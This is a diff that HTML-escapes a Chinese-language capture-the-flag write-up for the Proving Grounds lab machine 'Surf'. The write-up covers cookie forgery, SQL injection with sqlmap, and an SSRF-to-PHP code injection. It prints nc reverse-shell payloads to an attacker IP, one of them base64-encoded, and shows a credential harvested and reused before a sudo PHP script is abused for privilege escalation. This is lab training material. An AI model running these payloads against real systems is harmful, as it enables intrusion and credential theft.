@@ -1,7 +1,7 @@
 # ProvingGrouds Surf WriteUp
 
 
-<!--more-->
+&lt;!--more--&gt;
 
 ## 端口扫描：
 
@@ -17,7 +17,7 @@ Nmap scan report for 192.168.162.171
 Host is up (0.22s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)
 | vulners:  CVEs
 | ssh-hostkey: 
 |   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
@@ -28,8 +28,8 @@ PORT   STATE SERVICE VERSION
 | vulners: 
 |   cpe:/a:apache:http_server:2.4.38:  CVEs
 | http-enum: 
-|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
-|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
+|   /css/: Potentially interesting directory w/ listing on &#39;apache/2.4.38 (debian)&#39;
+|_  /js/: Potentially interesting directory w/ listing on &#39;apache/2.4.38 (debian)&#39;
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -54,14 +54,14 @@ Web扫描
 
 尝试暴破，失败
 
-登录失败的返回包中有这个头`Set-Cookie: auth_status=eydzdWNjZXNzJzonZmFsc2UnfQ%3D%3D`，base64接码后为`{'success':'false'}`
+登录失败的返回包中有这个头`Set-Cookie: auth_status=eydzdWNjZXNzJzonZmFsc2UnfQ%3D%3D`，base64接码后为`{&#39;success&#39;:&#39;false&#39;}`
 
 抓包改包，手动修改为true后进入后台，绕过前端限制。
 
 发现有个页面，测试发现存在order by点位的注入
 
 ```shell
-http://192.168.162.171/administration/customers.php?search_string=c&filter_col=if((substr(version(),1,1)='8'),id,phone)&order_by=asc
+http://192.168.162.171/administration/customers.php?search_string=c&amp;filter_col=if((substr(version(),1,1)=&#39;8&#39;),id,phone)&amp;order_by=asc
 ```
 
 测试发现后端SQL语句为：
@@ -74,48 +74,48 @@ SELECT SQL_CALC_FOUND_ROWS id, f_name, l_name, gender, phone, created_at, update
 
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf]
-└─$ sqlmap -r sqli.txt --banner --level=3 --risk=3 -p 'filter_col' --batch
+└─$ sqlmap -r sqli.txt --banner --level=3 --risk=3 -p &#39;filter_col&#39; --batch
 ……
-GET parameter 'filter_col' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+GET parameter &#39;filter_col&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 516 HTTP(s) requests:
 ---
 Parameter: filter_col (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-    Payload: search_string=c&filter_col=id AND 7911=(SELECT (CASE WHEN (7911=7911) THEN 7911 ELSE (SELECT 6771 UNION SELECT 4630) END))-- -&order_by=asc
+    Payload: search_string=c&amp;filter_col=id AND 7911=(SELECT (CASE WHEN (7911=7911) THEN 7911 ELSE (SELECT 6771 UNION SELECT 4630) END))-- -&amp;order_by=asc
 
     Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: search_string=c&filter_col=id AND (SELECT 9022 FROM (SELECT(SLEEP(5)))HmQp)&order_by=asc
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: search_string=c&amp;filter_col=id AND (SELECT 9022 FROM (SELECT(SLEEP(5)))HmQp)&amp;order_by=asc
 ---
 [16:36:30] [INFO] the back-end DBMS is MySQL
 [16:36:30] [INFO] fetching banner
-[16:36:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
-[16:36:30] [INFO] retrieved: 10.3.31-MariaDB-0+deb10u1
+[16:36:30] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
+[16:36:30] [INFO] retrieved: 10.3.31-MariaDB-0&#43;deb10u1
 web server operating system: Linux Debian 10 (buster)
 web application technology: Apache 2.4.38
-back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-banner: '10.3.31-MariaDB-0+deb10u1'
-[16:37:10] [INFO] fetched data logged to text files under '/home/xavier/.local/share/sqlmap/output/192.168.162.171'
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+banner: &#39;10.3.31-MariaDB-0&#43;deb10u1&#39;
+[16:37:10] [INFO] fetched data logged to text files under &#39;/home/xavier/.local/share/sqlmap/output/192.168.162.171&#39;
 
 [*] ending @ 16:37:10 /2023-12-03/
 
 # 写shell失败
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf]
-└─$ sqlmap -r sqli.txt --level=3 --risk=3 -p 'filter_col' --batch --os-shell
+└─$ sqlmap -r sqli.txt --level=3 --risk=3 -p &#39;filter_col&#39; --batch --os-shell
 
 # 获取数据
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf]
-└─$ sqlmap -r sqli.txt --level=3 --risk=3 -p 'filter_col' --batch --dump
+└─$ sqlmap -r sqli.txt --level=3 --risk=3 -p &#39;filter_col&#39; --batch --dump
 ……
 Database: corephpadmin
 Table: admin_accounts
 [1 entry]
-+----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+
+&#43;----&#43;-----------&#43;---------&#43;--------------------------------------------------------------&#43;-----------&#43;------------&#43;----------------&#43;
 | id | series_id | expires | password                                                     | user_name | admin_type | remember_token |
-+----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+
+&#43;----&#43;-----------&#43;---------&#43;--------------------------------------------------------------&#43;-----------&#43;------------&#43;----------------&#43;
 | 11 | NULL      | NULL    | $2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm | james     | super      | NULL           |
-+----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+
+&#43;----&#43;-----------&#43;---------&#43;--------------------------------------------------------------&#43;-----------&#43;------------&#43;----------------&#43;
 ……
 ```
 
@@ -125,14 +125,14 @@ Table: admin_accounts
 
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf]
-└─$ hashid '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm'
-Analyzing '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm'
-[+] Blowfish(OpenBSD) 
-[+] Woltlab Burning Board 4.x 
-[+] bcrypt 
+└─$ hashid &#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39;
+Analyzing &#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39;
+[&#43;] Blowfish(OpenBSD) 
+[&#43;] Woltlab Burning Board 4.x 
+[&#43;] bcrypt 
                                                                                                                                                                                                               
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf]
-└─$ echo '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm' > james.hash
+└─$ echo &#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39; &gt; james.hash
                                                                                                                                                                                                               
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf]
 └─$ hashcat -h | grep -i bcrypt                                                                                       
@@ -175,7 +175,7 @@ Papers: No Results
 POST /administration/checkserver.php HTTP/1.1
 Host: 192.168.162.171
 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
@@ -208,7 +208,7 @@ url=http%3A%2F%2F127.0.0.1%3A8080//infusions/downloads/downloads.php?cat_id=$%5C
 # 解码后
 http://127.0.0.1:8080//infusions/downloads/downloads.php?cat_id=$\{system(base64_decode(cGhwIC1yICdleGVjKCJuYyAxOTIuMTY4LjQ1LjE5NyA4MCAtZSAvYmluL3NoIik7JyAg)).exit\}
 
-php -r 'exec("nc 192.168.45.197 80 -e /bin/sh");'  
+php -r &#39;exec(&#34;nc 192.168.45.197 80 -e /bin/sh&#34;);&#39;  
 ```
 
 
@@ -226,7 +226,7 @@ ls /home/james/
 local.txt
 cat /home/james/local.txt
 a4e66109b23dd0df9165c992668efe14
-python3 -c 'import pty;pty.spawn("/bin/bash")';
+python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;;
 www-data@Surf:/var/www/html/infusions/downloads$
 ```
 
@@ -238,16 +238,16 @@ linpeas信息搜集
 
 ```shell
 ╔══════════╣ Searching passwords in config PHP files
-$locale['853'] = "Admin Password:";
-define('DB_PASSWORD', "FlyToTheMoon213!");
-define('DB_USER', "core");
+$locale[&#39;853&#39;] = &#34;Admin Password:&#34;;
+define(&#39;DB_PASSWORD&#39;, &#34;FlyToTheMoon213!&#34;);
+define(&#39;DB_USER&#39;, &#34;core&#34;);
 ```
 
 拿到密码，试出来是james的
 
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf]
-└─$ sshpass -p 'FlyToTheMoon213!' ssh james@192.168.162.171
+└─$ sshpass -p &#39;FlyToTheMoon213!&#39; ssh james@192.168.162.171
 Linux Surf 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -258,7 +258,7 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 $ id
 uid=1000(james) gid=1000(james) groups=1000(james)
-$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;;
 james@Surf:~$ ls
 local.txt
 james@Surf:~$ cat local.txt 
@@ -310,14 +310,14 @@ www-data@Surf:/var/backups$ ls -l database-backup.php
 james@Surf:~$ vi /var/backups/database-backup.php
 james@Surf:~$ 
 james@Surf:~$ head /var/backups/database-backup.php
-<?php
+&lt;?php
 
 /**
 * Updated: Mohammad M. AlBanna
 * Website: MBanna.info
 */
 
-system("nc 192.168.45.197 9000 -e /bin/sh");
+system(&#34;nc 192.168.45.197 9000 -e /bin/sh&#34;);
 
 james@Surf:~$ sudo /usr/bin/php /var/backups/database-backup.php
 
